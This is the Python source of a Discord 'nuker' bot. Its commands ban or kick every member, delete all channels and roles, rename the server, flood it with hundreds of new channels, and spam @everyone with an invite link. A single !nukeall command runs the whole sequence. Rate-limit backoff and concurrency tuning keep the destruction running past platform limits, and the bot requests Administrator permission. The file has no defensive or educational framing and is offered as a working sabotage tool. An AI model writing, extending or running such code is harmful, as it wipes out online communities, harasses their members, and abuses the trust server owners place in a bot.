import discord
from discord.ext import commands
from discord import HTTPException, NotFound, Forbidden, RateLimited
import asyncio
import os
import random

BOT_TOKEN = os.getenv("DISCORD_TOKEN")
NUKE_GUILD_ICON_URL = os.getenv("GUILD_ICON_URL", "")

BLOCKED_GUILD_ID = os.getenv("BLOCKED_GUILD_ID", "")

ALLOWED_IN_BLOCKED = {"help", "invite"}

if not BOT_TOKEN:
    raise RuntimeError("DISCORD_TOKEN environment variable is not set.")

MODE = "BAN"

GUILD_MODES = {}

NUKE_CREATE_NAME = "by 909"
NUKE_CREATE_AMOUNT = 300
NUKE_GUILD_NEW_NAME = "community 909"
NUKE_GUILD_DESCRIPTION = "community 909 - by exagonal&chiskiado"
NUKE_INVITE_LINK = "https://discord.gg/BxTk5SrBv"
NUKE_INVITE_TEXT = f"@everyone {NUKE_INVITE_LINK}"
NUKE_INVITES_PER_CHANNEL = 1

SPAMALL_DEFAULT_PER_CHANNEL = 1000

CONC_DELETE = 16
CONC_MEMBERS = 16
CONC_CREATE = 10
CONC_SEND = 10

TIMEOUT_RENAME = 20
TIMEOUT_DELETE = 240
TIMEOUT_MEMBERS = 240
TIMEOUT_CREATE = 480
TIMEOUT_INVITE = 3600

GLOBAL_LOCK = asyncio.Semaphore(22)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def is_blocked(ctx) -> bool:
    if not BLOCKED_GUILD_ID:
        return False
    try:
        return ctx.guild is not None and str(ctx.guild.id) == str(BLOCKED_GUILD_ID)
    except Exception:
        return False

@bot.check
async def global_guild_block(ctx):
    if not is_blocked(ctx):
        return True
    return ctx.command.name in ALLOWED_IN_BLOCKED

@bot.event
async def on_ready():
    print(f"READY: {bot.user} | Guilds: {len(bot.guilds)}")

def get_mode(guild_id: int) -> str:
    return GUILD_MODES.get(guild_id, MODE)

ZWSP = "\u200b"

def channel_name(base: str, index: int) -> str:
    if index == 0:
        return base
    return base + (ZWSP * index)

async def safe_call(coro_factory, retries: int = 5):
    for attempt in range(retries):
        async with GLOBAL_LOCK:
            try:
                return await asyncio.wait_for(coro_factory(), timeout=15)
            except RateLimited as e:
                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)) + 0.2)
                continue
            except HTTPException as e:
                status = getattr(e, "status", 0)
                if status == 429:
                    await asyncio.sleep(2.0 + random.uniform(0, 1.0))
                    continue
                if 500 <= status < 600:
                    await asyncio.sleep(0.5 + attempt * 0.3)
                    continue
                return None
            except (NotFound, Forbidden):
                return None
            except asyncio.TimeoutError:
                await asyncio.sleep(0.3)
                continue
            except Exception:
                return None
    return None

async def safe_send(target, content: str = None, embed=None):
    try:
        kwargs = {}
        if content is not None:
            kwargs["content"] = content
        if embed is not None:
            kwargs["embed"] = embed
        if isinstance(target, commands.Context):
            await safe_call(lambda: target.send(**kwargs))
        else:
            await safe_call(lambda: target.send(**kwargs))
    except Exception:
        pass

async def worker_pool(items, handler, concurrency: int, phase_timeout: float, per_item_timeout: float = 20):
    sem = asyncio.Semaphore(concurrency)
    results = []
    extra_delay = 0.0
    lock = asyncio.Lock()

    async def run_one(item):
        nonlocal extra_delay
        async with sem:
            if extra_delay > 0:
                await asyncio.sleep(extra_delay)
            try:
                r = await asyncio.wait_for(handler(item), timeout=per_item_timeout)
                results.append(r)
            except RateLimited:
                async with lock:
                    extra_delay = min(extra_delay + 0.20, 1.5)
                try:
                    await asyncio.sleep(1.0)
                    r = await asyncio.wait_for(handler(item), timeout=per_item_timeout)
                    results.append(r)
                except Exception:
                    results.append(None)
            except Exception:
                results.append(None)
            else:
                if extra_delay > 0:
                    async with lock:
                        extra_delay = max(0.0, extra_delay - 0.03)

    try:
        await asyncio.wait_for(
            asyncio.gather(*[run_one(i) for i in items], return_exceptions=True),
            timeout=phase_timeout,
        )
    except Exception:
        pass
    return results

@bot.command(name="help")
async def help_cmd(ctx):
    await safe_send(
        ctx,
        "MEGA NUKE COMMANDS\n"
        "!help\n!ban / !kick\n!delch\n"
        "!hypercreate [name] [amount] / !hc\n"
        "!spam [msg] [count]\n!spamall [msg] [por_channel]\n"
        "!delroles\n!nukeall\n!setban / !setkick\n!invite",
    )

@bot.command(name="invite")
async def invite_cmd(ctx):
    client_id = bot.user.id
    invite_url = f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot%20applications.commands"

    embed = discord.Embed(
        title="Invite botnuker",
        description="Haz clic en el enlace de abajo para anadir el bot a tu servidor.",
        color=discord.Color(0xFFFFFF),
        url=invite_url,
    )
    embed.add_field(
        name="Permissions",
        value="Administrator",
        inline=False,
    )
    embed.add_field(
        name="Invite link",
        value=invite_url,
        inline=False,
    )
    embed.set_thumbnail(url=bot.user.display_avatar.url)
    embed.set_footer(text="by exagonal")

    await safe_send(ctx, embed=embed)

@bot.command(name="setban")
async def set_ban(ctx):
    GUILD_MODES[ctx.guild.id] = "BAN"
    await safe_send(ctx, "MODE: BAN")

@bot.command(name="setkick")
async def set_kick(ctx):
    GUILD_MODES[ctx.guild.id] = "KICK"
    await safe_send(ctx, "MODE: KICK")

@bot.command(name="ban")
async def ban_only(ctx):
    await safe_send(ctx, "BANNING...")
    members = [m for m in ctx.guild.members if not m.bot]
    await worker_pool(members, lambda m: safe_call(lambda: m.ban(reason="NUKE")), CONC_MEMBERS, TIMEOUT_MEMBERS)
    await safe_send(ctx, "BAN DONE")

@bot.command(name="kick")
async def kick_only(ctx):
    await safe_send(ctx, "KICKING...")
    members = [m for m in ctx.guild.members if not m.bot]
    await worker_pool(members, lambda m: safe_call(lambda: m.kick(reason="NUKE")), CONC_MEMBERS, TIMEOUT_MEMBERS)
    await safe_send(ctx, "KICK DONE")

@bot.command(name="delch")
async def del_channels(ctx):
    await safe_send(ctx, "DELETING CHANNELS...")
    chans = list(ctx.guild.channels)
    await worker_pool(chans, lambda c: safe_call(lambda: c.delete()), CONC_DELETE, TIMEOUT_DELETE)
    await safe_send(ctx, "CHANNELS DELETED")

@bot.command(name="hypercreate")
async def hypercreate(ctx, name: str = "LIGHT", amount: int = 200):
    await safe_send(ctx, f"CREATING {amount} CHANNELS...")
    guild = ctx.guild
    indices = list(range(amount))
    results = await worker_pool(
        indices,
        lambda i: safe_call(lambda: guild.create_text_channel(channel_name(name, i))),
        CONC_CREATE,
        TIMEOUT_CREATE,
    )
    success = sum(1 for r in results if r is not None)
    await safe_send(ctx, f"CREATED {success}/{amount} CHANNELS")

@bot.command(name="hc")
async def hypercreate_short(ctx, name: str = "LIGHT", amount: int = 200):
    await hypercreate(ctx, name, amount)

@bot.command(name="spam")
async def spam_current(ctx, msg: str = "@everyone", count: int = 100):
    await safe_send(ctx, f"SPAMMING {count} MSGS...")
    for _ in range(count):
        await safe_call(lambda: ctx.send(msg))
        await asyncio.sleep(0.35)
    await safe_send(ctx, "SPAM DONE")

@bot.command(name="spamall")
async def spam_all(ctx, msg: str = "@everyone", per_channel: int = SPAMALL_DEFAULT_PER_CHANNEL):
    await safe_send(ctx, f"SPAMMING {per_channel} MSGS IN ALL CHANNELS...")
    channels = list(ctx.guild.text_channels)

    async def spam_channel(ch):
        for _ in range(per_channel):
            await safe_call(lambda ch=ch: ch.send(msg))
            await asyncio.sleep(0.35)

    per_channel_timeout = per_channel * 0.5 + 60
    await worker_pool(channels, spam_channel, CONC_SEND, TIMEOUT_INVITE, per_item_timeout=per_channel_timeout)
    await safe_send(ctx, "SPAMALL DONE")

@bot.command(name="delroles")
async def del_roles(ctx):
    await safe_send(ctx, "DELETING ROLES...")
    roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
    await worker_pool(roles, lambda r: safe_call(lambda: r.delete()), CONC_DELETE, TIMEOUT_DELETE)
    await safe_send(ctx, "ROLES DELETED")

@bot.command(name="nukeall")
async def nukeall(ctx):
    guild = ctx.guild
    mode = get_mode(guild.id)

    await safe_send(ctx, f"NUKEALL - MODE: {mode}")

    async def apply_guild_identity():
        icon_bytes = None
        if NUKE_GUILD_ICON_URL:
            try:
                import aiohttp
                async with aiohttp.ClientSession() as s:
                    async with s.get(NUKE_GUILD_ICON_URL, timeout=20) as r:
                        if r.status == 200:
                            icon_bytes = await r.read()
            except Exception:
                icon_bytes = None

        kwargs = {
            "name": NUKE_GUILD_NEW_NAME,
            "description": NUKE_GUILD_DESCRIPTION,
            "reason": "NUKE",
        }
        if icon_bytes:
            kwargs["icon"] = icon_bytes

        try:
            await guild.edit(**kwargs)
        except Exception:
            try:
                await guild.edit(
                    name=NUKE_GUILD_NEW_NAME,
                    description=NUKE_GUILD_DESCRIPTION,
                    reason="NUKE",
                )
            except Exception:
                pass

    await safe_call(apply_guild_identity)

    chans = list(guild.channels)
    await worker_pool(chans, lambda c: safe_call(lambda: c.delete()), CONC_DELETE, TIMEOUT_DELETE)

    members = [m for m in guild.members if not m.bot]
    if mode == "BAN":
        await worker_pool(members, lambda m: safe_call(lambda: m.ban(reason="NUKE")), CONC_MEMBERS, TIMEOUT_MEMBERS)
    else:
        await worker_pool(members, lambda m: safe_call(lambda: m.kick(reason="NUKE")), CONC_MEMBERS, TIMEOUT_MEMBERS)

    indices = list(range(NUKE_CREATE_AMOUNT))
    create_results = await worker_pool(
        indices,
        lambda i: safe_call(lambda: guild.create_text_channel(channel_name(NUKE_CREATE_NAME, i))),
        CONC_CREATE,
        TIMEOUT_CREATE,
    )
    created_channels = [r for r in create_results if r is not None]

    async def send_invite(ch):
        for _ in range(NUKE_INVITES_PER_CHANNEL):
            await safe_call(lambda: ch.send(NUKE_INVITE_TEXT))
            await asyncio.sleep(0.35)

    await worker_pool(created_channels, send_invite, CONC_SEND, TIMEOUT_INVITE)

    done_msg = (
        f"NUKEALL COMPLETE\n"
        f"Guild renamed to: {NUKE_GUILD_NEW_NAME}\n"
        f"Channels created: {len(created_channels)}/{NUKE_CREATE_AMOUNT}\n"
        f"Invites sent."
    )
    if created_channels:
        await safe_send(created_channels[0], done_msg)

bot.run(BOT_TOKEN)
